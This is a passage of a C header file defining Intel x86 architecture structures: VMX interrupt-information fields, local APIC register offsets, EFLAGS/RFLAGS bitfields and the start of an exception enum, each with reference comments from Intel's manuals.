#define VMENTRY_INTERRUPT_INFORMATION_VECTOR(_) (((_) >> 0) & 0xFF)

    /**
     * @brief Interruption type
     *
     * [Bits 10:8] Determines details of how the injection is performed.
     */
    UINT32 InterruptionType : 3;
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_BIT 8
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_FLAG 0x700
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_MASK 0x07
#define VMENTRY_INTERRUPT_INFORMATION_INTERRUPTION_TYPE(_) (((_) >> 8) & 0x07)

    /**
     * @brief Deliver error code (0 = do not deliver; 1 = deliver)
     *
     * [Bit 11] Determines whether delivery pushes an error code on the guest stack.
     */
    UINT32 DeliverErrorCode : 1;
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE_BIT 11
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE_FLAG 0x800
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE_MASK 0x01
#define VMENTRY_INTERRUPT_INFORMATION_DELIVER_ERROR_CODE(_) (((_) >> 11) & 0x01)
    UINT32 Reserved1 : 19;

    /**
     * @brief Valid
     *
     * [Bit 31] VM entry injects an event if and only if the valid bit is 1. The valid bit in this
     * field is cleared on every VM exit.
     */
    UINT32 Valid : 1;
#define VMENTRY_INTERRUPT_INFORMATION_VALID_BIT 31
#define VMENTRY_INTERRUPT_INFORMATION_VALID_FLAG 0x80000000
#define VMENTRY_INTERRUPT_INFORMATION_VALID_MASK 0x01
#define VMENTRY_INTERRUPT_INFORMATION_VALID(_) (((_) >> 31) & 0x01)
  };

  UINT32 Flags;
} VMENTRY_INTERRUPT_INFORMATION;

/**
 * @brief VM entry can be configured to conclude by delivering an event through the IDT (after all
 * guest state and MSRs have been loaded). This process is called event injection and is controlled
 * by these VM-entry control fields
 *
 * @see Vol3A[24.9.2(Information for VM Exits Due to Vectored Events)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bits 7:0] Vector of interrupt or exception.
     */
    UINT32 Vector : 8;
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR_BIT 0
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR_FLAG 0xFF
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR_MASK 0xFF
#define VMEXIT_INTERRUPT_INFORMATION_VECTOR(_) (((_) >> 0) & 0xFF)

    /**
     * [Bits 10:8] Interruption type.
     */
    UINT32 InterruptionType : 3;
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_BIT 8
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_FLAG 0x700
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE_MASK 0x07
#define VMEXIT_INTERRUPT_INFORMATION_INTERRUPTION_TYPE(_) (((_) >> 8) & 0x07)

    /**
     * [Bit 11] Deliver error code (0 = do not deliver; 1 = deliver).
     */
    UINT32 ErrorCodeValid : 1;
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID_BIT 11
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID_FLAG 0x800
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID_MASK 0x01
#define VMEXIT_INTERRUPT_INFORMATION_ERROR_CODE_VALID(_) (((_) >> 11) & 0x01)

    /**
     * [Bit 12] NMI unblocking due to IRET.
     */
    UINT32 NmiUnblocking : 1;
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING_BIT 12
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING_FLAG 0x1000
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING_MASK 0x01
#define VMEXIT_INTERRUPT_INFORMATION_NMI_UNBLOCKING(_) (((_) >> 12) & 0x01)
    UINT32 Reserved1 : 18;

    /**
     * [Bit 31] Valid.
     */
    UINT32 Valid : 1;
#define VMEXIT_INTERRUPT_INFORMATION_VALID_BIT 31
#define VMEXIT_INTERRUPT_INFORMATION_VALID_FLAG 0x80000000
#define VMEXIT_INTERRUPT_INFORMATION_VALID_MASK 0x01
#define VMEXIT_INTERRUPT_INFORMATION_VALID(_) (((_) >> 31) & 0x01)
  };

  UINT32 Flags;
} VMEXIT_INTERRUPT_INFORMATION;

/**
 * @}
 */

/**
 * @defgroup APIC \
 *           Advanced Programmable Interrupt Controller (APIC)
 *
 * Software interacts with the local APIC by reading and writing its registers. APIC registers are
 * memory-mapped to a 4-KByte region of the processor's physical address space with an initial
 * starting address of FEE00000H. For correct APIC operation, this address space must be mapped to
 * an area of memory that has been designated as strong uncacheable (UC).
 *
 * @remarks Registers are 32 bits, 64 bits, or 256 bits in width; all are aligned on 128-bit
 * boundaries. All 32-bit registers should be accessed using 128-bit aligned 32-bit loads or stores.
 * Some processors may support loads and stores of less than 32 bits to some of the APIC registers.
 * This is model specific behavior and is not guaranteed to work on all processors. Any FP/MMX/SSE
 * access to an APIC register, or any access that touches bytes 4 through 15 of an APIC register may
 * cause undefined behavior and must not be executed. This undefined behavior could include hangs,
 * incorrect results or unexpected exceptions, including machine checks, and may vary between
 * implementations. Wider registers (64-bit or 256-bit) must be accessed using multiple 32-bit loads
 * or stores, with all accesses being 128-bit aligned.
 * @see Vol3A[10.4.1(The Local APIC Block Diagram)] (reference)
 * @{
 */
/**
 * Local APIC Base Address.
 *
 * @remarks Reserved.
 */
#define APIC_BASE_ADDRESS 0xFEE00000

/**
 * Local APIC ID Register.
 */
#define APIC_ID 0x00000020

/**
 * Local APIC Version Register.
 */
#define APIC_VERSION 0x00000030

/**
 * Task Priority Register (TPR).
 */
#define APIC_TASK_PRIORITY 0x00000080

/**
 * Arbitration Priority Register (APR).
 */
#define APIC_ARBITRATION_PRIORITY 0x00000090

/**
 * Processor Priority Register (PPR).
 */
#define APIC_PROCESSOR_PRIORITY 0x000000A0

/**
 * EOI Register.
 */
#define APIC_EOI 0x000000B0

/**
 * Remote Read Register (RRD).
 */
#define APIC_REMOTE_READ 0x000000C0

/**
 * Logical Destination Register.
 */
#define APIC_LOGICAL_DESTINATION 0x000000D0

/**
 * Destination Format Register.
 *
 * @see Vol3A[10.6.2.2(Logical Destination Mode)]
 */
#define APIC_DESTINATION_FORMAT 0x000000E0

/**
 * Spurious Interrupt Vector Register.
 *
 * @see Vol3A[10.9(SPURIOUS INTERRUPT)]
 */
#define APIC_SPURIOUS_INTERRUPT_VECTOR 0x000000F0

/**
 * In-Service Register (ISR); bits 31:0.
 */
#define APIC_IN_SERVICE_BITS_31_0 0x00000100

/**
 * In-Service Register (ISR); bits 63:32.
 */
#define APIC_IN_SERVICE_BITS_63_32 0x00000110

/**
 * In-Service Register (ISR); bits 95:64.
 */
#define APIC_IN_SERVICE_BITS_95_64 0x00000120

/**
 * In-Service Register (ISR); bits 127:96.
 */
#define APIC_IN_SERVICE_BITS_127_96 0x00000130

/**
 * In-Service Register (ISR); bits 159:128.
 */
#define APIC_IN_SERVICE_BITS_159_128 0x00000140

/**
 * In-Service Register (ISR); bits 191:160.
 */
#define APIC_IN_SERVICE_BITS_191_160 0x00000150

/**
 * In-Service Register (ISR); bits 223:192.
 */
#define APIC_IN_SERVICE_BITS_223_192 0x00000160

/**
 * In-Service Register (ISR); bits 255:224.
 */
#define APIC_IN_SERVICE_BITS_255_224 0x00000170

/**
 * Trigger Mode Register (TMR); bits 31:0.
 */
#define APIC_TRIGGER_MODE_BITS_31_0 0x00000180

/**
 * Trigger Mode Register (TMR); bits 63:32.
 */
#define APIC_TRIGGER_MODE_BITS_63_32 0x00000190

/**
 * Trigger Mode Register (TMR); bits 95:64.
 */
#define APIC_TRIGGER_MODE_BITS_95_64 0x000001A0

/**
 * Trigger Mode Register (TMR); bits 127:96.
 */
#define APIC_TRIGGER_MODE_BITS_127_96 0x000001B0

/**
 * Trigger Mode Register (TMR); bits 159:128.
 */
#define APIC_TRIGGER_MODE_BITS_159_128 0x000001C0

/**
 * Trigger Mode Register (TMR); bits 191:160.
 */
#define APIC_TRIGGER_MODE_BITS_191_160 0x000001D0

/**
 * Trigger Mode Register (TMR); bits 223:192.
 */
#define APIC_TRIGGER_MODE_BITS_223_192 0x000001E0

/**
 * Trigger Mode Register (TMR); bits 255:224.
 */
#define APIC_TRIGGER_MODE_BITS_255_224 0x000001F0

/**
 * Interrupt Request Register (IRR); bits 31:0.
 */
#define APIC_INTERRUPT_REQUEST_BITS_31_0 0x00000200

/**
 * Interrupt Request Register (IRR); bits 63:32.
 */
#define APIC_INTERRUPT_REQUEST_BITS_63_32 0x00000210

/**
 * Interrupt Request Register (IRR); bits 95:64.
 */
#define APIC_INTERRUPT_REQUEST_BITS_95_64 0x00000220

/**
 * Interrupt Request Register (IRR); bits 127:96.
 */
#define APIC_INTERRUPT_REQUEST_BITS_127_96 0x00000230

/**
 * Interrupt Request Register (IRR); bits 159:128.
 */
#define APIC_INTERRUPT_REQUEST_BITS_159_128 0x00000240

/**
 * Interrupt Request Register (IRR); bits 191:160.
 */
#define APIC_INTERRUPT_REQUEST_BITS_191_160 0x00000250

/**
 * Interrupt Request Register (IRR); bits 223:192.
 */
#define APIC_INTERRUPT_REQUEST_BITS_223_192 0x00000260

/**
 * Interrupt Request Register (IRR); bits 255:224.
 */
#define APIC_INTERRUPT_REQUEST_BITS_255_224 0x00000270

/**
 * Error Status Register.
 */
#define APIC_ERROR_STATUS 0x00000280

/**
 * LVT Corrected Machine Check Interrupt (CMCI) Register.
 */
#define APIC_LVT_CORRECTED_MACHINE_CHECK_INTERRUPT 0x000002F0

/**
 * Interrupt Command Register (ICR); bits 0-31.
 */
#define APIC_INTERRUPT_COMMAND_BITS_0_31 0x00000300

/**
 * Interrupt Command Register (ICR); bits 32-63.
 */
#define APIC_INTERRUPT_COMMAND_BITS_32_63 0x00000310

/**
 * LVT Timer Register.
 */
#define APIC_LVT_TIMER 0x00000320

/**
 * LVT Thermal Sensor Register.
 */
#define APIC_LVT_THERMAL_SENSOR 0x00000330

/**
 * LVT Performance Monitoring Counters Register.
 */
#define APIC_LVT_PERFORMANCE_MONITORING_COUNTERS 0x00000340

/**
 * LVT LINT0 Register.
 */
#define APIC_LVT_LINT0 0x00000350

/**
 * LVT LINT1 Register.
 */
#define APIC_LVT_LINT1 0x00000360

/**
 * LVT Error Register.
 */
#define APIC_LVT_ERROR 0x00000370

/**
 * Initial Count Register (for Timer).
 */
#define APIC_INITIAL_COUNT 0x00000380

/**
 * Current Count Register (for Timer).
 */
#define APIC_CURRENT_COUNT 0x00000390

/**
 * Divide Configuration Register (for Timer).
 */
#define APIC_DIVIDE_CONFIGURATION 0x000003E0
/**
 * @}
 */

/**
 * The 32-bit EFLAGS register contains a group of status flags, a control flag, and a group of
 * system flags. The status flags (bits 0, 2, 4, 6, 7, and 11) of the EFLAGS register indicate the
 * results of arithmetic instructions, such as the ADD, SUB, MUL, and DIV instructions. The system
 * flags and IOPL field in the EFLAGS register control operating-system or executive operations.
 *
 * @see Vol1[3.4.3(EFLAGS)] (reference)
 */
typedef union {
  struct {
    /**
     * @brief Carry flag
     *
     * [Bit 0] Set if an arithmetic operation generates a carry or a borrow out of the
     * mostsignificant bit of the result; cleared otherwise. This flag indicates an overflow
     * condition for unsigned-integer arithmetic. It is also used in multiple-precision arithmetic.
     */
    UINT32 CarryFlag : 1;
#define EFLAGS_CARRY_FLAG_BIT 0
#define EFLAGS_CARRY_FLAG_FLAG 0x01
#define EFLAGS_CARRY_FLAG_MASK 0x01
#define EFLAGS_CARRY_FLAG(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Reserved - always 1
     */
    UINT32 ReadAs1 : 1;
#define EFLAGS_READ_AS_1_BIT 1
#define EFLAGS_READ_AS_1_FLAG 0x02
#define EFLAGS_READ_AS_1_MASK 0x01
#define EFLAGS_READ_AS_1(_) (((_) >> 1) & 0x01)

    /**
     * @brief Parity flag
     *
     * [Bit 2] Set if the least-significant byte of the result contains an even number of 1 bits;
     * cleared otherwise.
     */
    UINT32 ParityFlag : 1;
#define EFLAGS_PARITY_FLAG_BIT 2
#define EFLAGS_PARITY_FLAG_FLAG 0x04
#define EFLAGS_PARITY_FLAG_MASK 0x01
#define EFLAGS_PARITY_FLAG(_) (((_) >> 2) & 0x01)
    UINT32 Reserved1 : 1;

    /**
     * @brief Auxiliary Carry flag
     *
     * [Bit 4] Set if an arithmetic operation generates a carry or a borrow out of bit 3 of the
     * result; cleared otherwise. This flag is used in binary-coded decimal (BCD) arithmetic.
     */
    UINT32 AuxiliaryCarryFlag : 1;
#define EFLAGS_AUXILIARY_CARRY_FLAG_BIT 4
#define EFLAGS_AUXILIARY_CARRY_FLAG_FLAG 0x10
#define EFLAGS_AUXILIARY_CARRY_FLAG_MASK 0x01
#define EFLAGS_AUXILIARY_CARRY_FLAG(_) (((_) >> 4) & 0x01)
    UINT32 Reserved2 : 1;

    /**
     * @brief Zero flag
     *
     * [Bit 6] Set if the result is zero; cleared otherwise.
     */
    UINT32 ZeroFlag : 1;
#define EFLAGS_ZERO_FLAG_BIT 6
#define EFLAGS_ZERO_FLAG_FLAG 0x40
#define EFLAGS_ZERO_FLAG_MASK 0x01
#define EFLAGS_ZERO_FLAG(_) (((_) >> 6) & 0x01)

    /**
     * @brief Sign flag
     *
     * [Bit 7] Set equal to the most-significant bit of the result, which is the sign bit of a
     * signed integer. (0 indicates a positive value and 1 indicates a negative value.)
     */
    UINT32 SignFlag : 1;
#define EFLAGS_SIGN_FLAG_BIT 7
#define EFLAGS_SIGN_FLAG_FLAG 0x80
#define EFLAGS_SIGN_FLAG_MASK 0x01
#define EFLAGS_SIGN_FLAG(_) (((_) >> 7) & 0x01)

    /**
     * @brief Trap flag
     *
     * [Bit 8] Set to enable single-step mode for debugging; clear to disable single-step mode.
     */
    UINT32 TrapFlag : 1;
#define EFLAGS_TRAP_FLAG_BIT 8
#define EFLAGS_TRAP_FLAG_FLAG 0x100
#define EFLAGS_TRAP_FLAG_MASK 0x01
#define EFLAGS_TRAP_FLAG(_) (((_) >> 8) & 0x01)

    /**
     * @brief Interrupt enable flag
     *
     * [Bit 9] Controls the response of the processor to maskable interrupt requests. Set to respond
     * to maskable interrupts; cleared to inhibit maskable interrupts.
     */
    UINT32 InterruptEnableFlag : 1;
#define EFLAGS_INTERRUPT_ENABLE_FLAG_BIT 9
#define EFLAGS_INTERRUPT_ENABLE_FLAG_FLAG 0x200
#define EFLAGS_INTERRUPT_ENABLE_FLAG_MASK 0x01
#define EFLAGS_INTERRUPT_ENABLE_FLAG(_) (((_) >> 9) & 0x01)

    /**
     * @brief Direction flag
     *
     * [Bit 10] Controls string instructions (MOVS, CMPS, SCAS, LODS, and STOS). Setting the DF flag
     * causes the string instructions to auto-decrement (to process strings from high addresses to
     * low addresses). Clearing the DF flag causes the string instructions to auto-increment
     * (process strings from low addresses to high addresses).
     */
    UINT32 DirectionFlag : 1;
#define EFLAGS_DIRECTION_FLAG_BIT 10
#define EFLAGS_DIRECTION_FLAG_FLAG 0x400
#define EFLAGS_DIRECTION_FLAG_MASK 0x01
#define EFLAGS_DIRECTION_FLAG(_) (((_) >> 10) & 0x01)

    /**
     * @brief Overflow flag
     *
     * [Bit 11] Set if the integer result is too large a positive number or too small a negative
     * number (excluding the sign-bit) to fit in the destination operand; cleared otherwise. This
     * flag indicates an overflow condition for signed-integer (two's complement) arithmetic.
     */
    UINT32 OverflowFlag : 1;
#define EFLAGS_OVERFLOW_FLAG_BIT 11
#define EFLAGS_OVERFLOW_FLAG_FLAG 0x800
#define EFLAGS_OVERFLOW_FLAG_MASK 0x01
#define EFLAGS_OVERFLOW_FLAG(_) (((_) >> 11) & 0x01)

    /**
     * @brief I/O privilege level field
     *
     * [Bits 13:12] Indicates the I/O privilege level of the currently running program or task. The
     * current privilege level (CPL) of the currently running program or task must be less than or
     * equal to the I/O privilege level to access the I/O address space. The POPF and IRET
     * instructions can modify this field only when operating at a CPL of 0.
     */
    UINT32 IoPrivilegeLevel : 2;
#define EFLAGS_IO_PRIVILEGE_LEVEL_BIT 12
#define EFLAGS_IO_PRIVILEGE_LEVEL_FLAG 0x3000
#define EFLAGS_IO_PRIVILEGE_LEVEL_MASK 0x03
#define EFLAGS_IO_PRIVILEGE_LEVEL(_) (((_) >> 12) & 0x03)

    /**
     * @brief Nested task flag
     *
     * [Bit 14] Controls the chaining of interrupted and called tasks. Set when the current task is
     * linked to the previously executed task; cleared when the current task is not linked to
     * another task.
     */
    UINT32 NestedTaskFlag : 1;
#define EFLAGS_NESTED_TASK_FLAG_BIT 14
#define EFLAGS_NESTED_TASK_FLAG_FLAG 0x4000
#define EFLAGS_NESTED_TASK_FLAG_MASK 0x01
#define EFLAGS_NESTED_TASK_FLAG(_) (((_) >> 14) & 0x01)
    UINT32 Reserved3 : 1;

    /**
     * @brief Resume flag
     *
     * [Bit 16] Controls the processor's response to debug exceptions.
     */
    UINT32 ResumeFlag : 1;
#define EFLAGS_RESUME_FLAG_BIT 16
#define EFLAGS_RESUME_FLAG_FLAG 0x10000
#define EFLAGS_RESUME_FLAG_MASK 0x01
#define EFLAGS_RESUME_FLAG(_) (((_) >> 16) & 0x01)

    /**
     * @brief Virtual-8086 mode flag
     *
     * [Bit 17] Set to enable virtual-8086 mode; clear to return to protected mode without
     * virtual-8086 mode semantics.
     */
    UINT32 Virtual8086ModeFlag : 1;
#define EFLAGS_VIRTUAL_8086_MODE_FLAG_BIT 17
#define EFLAGS_VIRTUAL_8086_MODE_FLAG_FLAG 0x20000
#define EFLAGS_VIRTUAL_8086_MODE_FLAG_MASK 0x01
#define EFLAGS_VIRTUAL_8086_MODE_FLAG(_) (((_) >> 17) & 0x01)

    /**
     * @brief Alignment check (or access control) flag
     *
     * [Bit 18] If the AM bit is set in the CR0 register, alignment checking of user-mode data
     * accesses is enabled if and only if this flag is 1. If the SMAP bit is set in the CR4
     * register, explicit supervisor-mode data accesses to user-mode pages are allowed if and only
     * if this bit is 1.
     *
     * @see Vol3A[4.6(ACCESS RIGHTS)]
     */
    UINT32 AlignmentCheckFlag : 1;
#define EFLAGS_ALIGNMENT_CHECK_FLAG_BIT 18
#define EFLAGS_ALIGNMENT_CHECK_FLAG_FLAG 0x40000
#define EFLAGS_ALIGNMENT_CHECK_FLAG_MASK 0x01
#define EFLAGS_ALIGNMENT_CHECK_FLAG(_) (((_) >> 18) & 0x01)

    /**
     * @brief Virtual interrupt flag
     *
     * [Bit 19] Virtual image of the IF flag. Used in conjunction with the VIP flag. (To use this
     * flag and the VIP flag the virtual mode extensions are enabled by setting the VME flag in
     * control register CR4.)
     */
    UINT32 VirtualInterruptFlag : 1;
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG_BIT 19
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG_FLAG 0x80000
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG_MASK 0x01
#define EFLAGS_VIRTUAL_INTERRUPT_FLAG(_) (((_) >> 19) & 0x01)

    /**
     * @brief Virtual interrupt pending flag
     *
     * [Bit 20] Set to indicate that an interrupt is pending; clear when no interrupt is pending.
     * (Software sets and clears this flag; the processor only reads it.) Used in conjunction with
     * the VIF flag.
     */
    UINT32 VirtualInterruptPendingFlag : 1;
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_BIT 20
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_FLAG 0x100000
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_MASK 0x01
#define EFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG(_) (((_) >> 20) & 0x01)

    /**
     * @brief Identification flag
     *
     * [Bit 21] The ability of a program to set or clear this flag indicates support for the CPUID
     * instruction.
     */
    UINT32 IdentificationFlag : 1;
#define EFLAGS_IDENTIFICATION_FLAG_BIT 21
#define EFLAGS_IDENTIFICATION_FLAG_FLAG 0x200000
#define EFLAGS_IDENTIFICATION_FLAG_MASK 0x01
#define EFLAGS_IDENTIFICATION_FLAG(_) (((_) >> 21) & 0x01)
    UINT32 Reserved4 : 10;
  };

  UINT32 Flags;
} EFLAGS;

/**
 * The 64-bit RFLAGS register contains a group of status flags, a control flag, and a group of
 * system flags in 64-bit mode. The upper 32 bits of RFLAGS register is reserved. The lower 32 bits
 * of RFLAGS is the same as EFLAGS.
 *
 * @see EFLAGS
 * @see Vol1[3.4.3.4(RFLAGS Register in 64-Bit Mode)] (reference)
 */
typedef union {
  struct {
    /**
     * @brief Carry flag
     *
     * [Bit 0] See the description in EFLAGS.
     */
    UINT64 CarryFlag : 1;
#define RFLAGS_CARRY_FLAG_BIT 0
#define RFLAGS_CARRY_FLAG_FLAG 0x01
#define RFLAGS_CARRY_FLAG_MASK 0x01
#define RFLAGS_CARRY_FLAG(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Reserved - always 1
     */
    UINT64 ReadAs1 : 1;
#define RFLAGS_READ_AS_1_BIT 1
#define RFLAGS_READ_AS_1_FLAG 0x02
#define RFLAGS_READ_AS_1_MASK 0x01
#define RFLAGS_READ_AS_1(_) (((_) >> 1) & 0x01)

    /**
     * @brief Parity flag
     *
     * [Bit 2] See the description in EFLAGS.
     */
    UINT64 ParityFlag : 1;
#define RFLAGS_PARITY_FLAG_BIT 2
#define RFLAGS_PARITY_FLAG_FLAG 0x04
#define RFLAGS_PARITY_FLAG_MASK 0x01
#define RFLAGS_PARITY_FLAG(_) (((_) >> 2) & 0x01)
    UINT64 Reserved1 : 1;

    /**
     * @brief Auxiliary Carry flag
     *
     * [Bit 4] See the description in EFLAGS.
     */
    UINT64 AuxiliaryCarryFlag : 1;
#define RFLAGS_AUXILIARY_CARRY_FLAG_BIT 4
#define RFLAGS_AUXILIARY_CARRY_FLAG_FLAG 0x10
#define RFLAGS_AUXILIARY_CARRY_FLAG_MASK 0x01
#define RFLAGS_AUXILIARY_CARRY_FLAG(_) (((_) >> 4) & 0x01)
    UINT64 Reserved2 : 1;

    /**
     * @brief Zero flag
     *
     * [Bit 6] See the description in EFLAGS.
     */
    UINT64 ZeroFlag : 1;
#define RFLAGS_ZERO_FLAG_BIT 6
#define RFLAGS_ZERO_FLAG_FLAG 0x40
#define RFLAGS_ZERO_FLAG_MASK 0x01
#define RFLAGS_ZERO_FLAG(_) (((_) >> 6) & 0x01)

    /**
     * @brief Sign flag
     *
     * [Bit 7] See the description in EFLAGS.
     */
    UINT64 SignFlag : 1;
#define RFLAGS_SIGN_FLAG_BIT 7
#define RFLAGS_SIGN_FLAG_FLAG 0x80
#define RFLAGS_SIGN_FLAG_MASK 0x01
#define RFLAGS_SIGN_FLAG(_) (((_) >> 7) & 0x01)

    /**
     * @brief Trap flag
     *
     * [Bit 8] See the description in EFLAGS.
     */
    UINT64 TrapFlag : 1;
#define RFLAGS_TRAP_FLAG_BIT 8
#define RFLAGS_TRAP_FLAG_FLAG 0x100
#define RFLAGS_TRAP_FLAG_MASK 0x01
#define RFLAGS_TRAP_FLAG(_) (((_) >> 8) & 0x01)

    /**
     * @brief Interrupt enable flag
     *
     * [Bit 9] See the description in EFLAGS.
     */
    UINT64 InterruptEnableFlag : 1;
#define RFLAGS_INTERRUPT_ENABLE_FLAG_BIT 9
#define RFLAGS_INTERRUPT_ENABLE_FLAG_FLAG 0x200
#define RFLAGS_INTERRUPT_ENABLE_FLAG_MASK 0x01
#define RFLAGS_INTERRUPT_ENABLE_FLAG(_) (((_) >> 9) & 0x01)

    /**
     * @brief Direction flag
     *
     * [Bit 10] See the description in EFLAGS.
     */
    UINT64 DirectionFlag : 1;
#define RFLAGS_DIRECTION_FLAG_BIT 10
#define RFLAGS_DIRECTION_FLAG_FLAG 0x400
#define RFLAGS_DIRECTION_FLAG_MASK 0x01
#define RFLAGS_DIRECTION_FLAG(_) (((_) >> 10) & 0x01)

    /**
     * @brief Overflow flag
     *
     * [Bit 11] See the description in EFLAGS.
     */
    UINT64 OverflowFlag : 1;
#define RFLAGS_OVERFLOW_FLAG_BIT 11
#define RFLAGS_OVERFLOW_FLAG_FLAG 0x800
#define RFLAGS_OVERFLOW_FLAG_MASK 0x01
#define RFLAGS_OVERFLOW_FLAG(_) (((_) >> 11) & 0x01)

    /**
     * @brief I/O privilege level field
     *
     * [Bits 13:12] See the description in EFLAGS.
     */
    UINT64 IoPrivilegeLevel : 2;
#define RFLAGS_IO_PRIVILEGE_LEVEL_BIT 12
#define RFLAGS_IO_PRIVILEGE_LEVEL_FLAG 0x3000
#define RFLAGS_IO_PRIVILEGE_LEVEL_MASK 0x03
#define RFLAGS_IO_PRIVILEGE_LEVEL(_) (((_) >> 12) & 0x03)

    /**
     * @brief Nested task flag
     *
     * [Bit 14] See the description in EFLAGS.
     */
    UINT64 NestedTaskFlag : 1;
#define RFLAGS_NESTED_TASK_FLAG_BIT 14
#define RFLAGS_NESTED_TASK_FLAG_FLAG 0x4000
#define RFLAGS_NESTED_TASK_FLAG_MASK 0x01
#define RFLAGS_NESTED_TASK_FLAG(_) (((_) >> 14) & 0x01)
    UINT64 Reserved3 : 1;

    /**
     * @brief Resume flag
     *
     * [Bit 16] See the description in EFLAGS.
     */
    UINT64 ResumeFlag : 1;
#define RFLAGS_RESUME_FLAG_BIT 16
#define RFLAGS_RESUME_FLAG_FLAG 0x10000
#define RFLAGS_RESUME_FLAG_MASK 0x01
#define RFLAGS_RESUME_FLAG(_) (((_) >> 16) & 0x01)

    /**
     * @brief Virtual-8086 mode flag
     *
     * [Bit 17] See the description in EFLAGS.
     */
    UINT64 Virtual8086ModeFlag : 1;
#define RFLAGS_VIRTUAL_8086_MODE_FLAG_BIT 17
#define RFLAGS_VIRTUAL_8086_MODE_FLAG_FLAG 0x20000
#define RFLAGS_VIRTUAL_8086_MODE_FLAG_MASK 0x01
#define RFLAGS_VIRTUAL_8086_MODE_FLAG(_) (((_) >> 17) & 0x01)

    /**
     * @brief Alignment check (or access control) flag
     *
     * [Bit 18] See the description in EFLAGS.
     *
     * @see Vol3A[4.6(ACCESS RIGHTS)]
     */
    UINT64 AlignmentCheckFlag : 1;
#define RFLAGS_ALIGNMENT_CHECK_FLAG_BIT 18
#define RFLAGS_ALIGNMENT_CHECK_FLAG_FLAG 0x40000
#define RFLAGS_ALIGNMENT_CHECK_FLAG_MASK 0x01
#define RFLAGS_ALIGNMENT_CHECK_FLAG(_) (((_) >> 18) & 0x01)

    /**
     * @brief Virtual interrupt flag
     *
     * [Bit 19] See the description in EFLAGS.
     */
    UINT64 VirtualInterruptFlag : 1;
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG_BIT 19
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG_FLAG 0x80000
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG_MASK 0x01
#define RFLAGS_VIRTUAL_INTERRUPT_FLAG(_) (((_) >> 19) & 0x01)

    /**
     * @brief Virtual interrupt pending flag
     *
     * [Bit 20] See the description in EFLAGS.
     */
    UINT64 VirtualInterruptPendingFlag : 1;
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_BIT 20
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_FLAG 0x100000
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG_MASK 0x01
#define RFLAGS_VIRTUAL_INTERRUPT_PENDING_FLAG(_) (((_) >> 20) & 0x01)

    /**
     * @brief Identification flag
     *
     * [Bit 21] See the description in EFLAGS.
     */
    UINT64 IdentificationFlag : 1;
#define RFLAGS_IDENTIFICATION_FLAG_BIT 21
#define RFLAGS_IDENTIFICATION_FLAG_FLAG 0x200000
#define RFLAGS_IDENTIFICATION_FLAG_MASK 0x01
#define RFLAGS_IDENTIFICATION_FLAG(_) (((_) >> 21) & 0x01)
    UINT64 Reserved4 : 42;
  };

  UINT64 Flags;
} RFLAGS;

/**
 * @defgroup EXCEPTIONS \
 *           Exceptions
 * @{
 */
/**
 * @brief Exceptions that can occur when the instruction is executed in protected mode.
 *        Each exception is given a mnemonic that consists of a pound sign (\#) followed by two
 * letters and an optional error code in parentheses. For example, \#GP(0) denotes a general
 * protection exception with an error code of 0
 *
 * @see Vol2A[3.1.1.13(Protected Mode Exceptions Section)] (reference)
 * @see Vol3A[6.3.1(External Interrupts)] (reference)
 */
typedef enum {
  /**
   * #DE - Divide Error.
   * Source: DIV and IDIV instructions.
   * Error Code: No.
   */
  DivideError = 0x00000000,

  /**
   * #DB - Debug.
   * Source: Any code or data reference.
   * Error Code: No.
   */
  Debug = 0x00000001,

  /**
   * Nonmaskable Interrupt.
   * Source: Generated externally by asserting the processor's NMI pin or
   *         through an NMI request set by the I/O APIC to the local APIC.
   * Error Code: No.
   */
  Nmi = 0x00000002,

  /**
   * #BP - Breakpoint.
   * Source: INT3 instruction.
   * Error Code: No.
   */
  Breakpoint = 0x00000003,

  /**
   * #OF - Overflow.
   * Source: INTO instruction.
   * Error Code: No.
   */
  Overflow = 0x00000004,

  /**
   * #BR - BOUND Range Exceeded.
   * Source: BOUND instruction.
   * Error Code: No.
   */
  BoundRangeExceeded = 0x00000005,

  /**
   * #UD - Invalid Opcode (Undefined Opcode).
   * Source: UD instruction or reserved opcode.
   * Error Code: No.
   */
  InvalidOpcode = 0x00000006,

  /**
   * #NM - Device Not Available (No Math Coprocessor).
   * Source: Floating-point or WAIT/FWAIT instruction.
   * Error Code: No.
   */
  DeviceNotAvailable = 0x00000007,

  /**
   * #DF - Double Fault.
   * Source: Any instruction that can generate an exception, an NMI, or an INTR.
   * Error Code: Yes (zero).
   */
  DoubleFault = 0x00000008,

  /**
   * #\## - Coprocessor Segment Overrun (reserved).
   * Source: Floating-point instruction.
   * Error Code: No.
   *
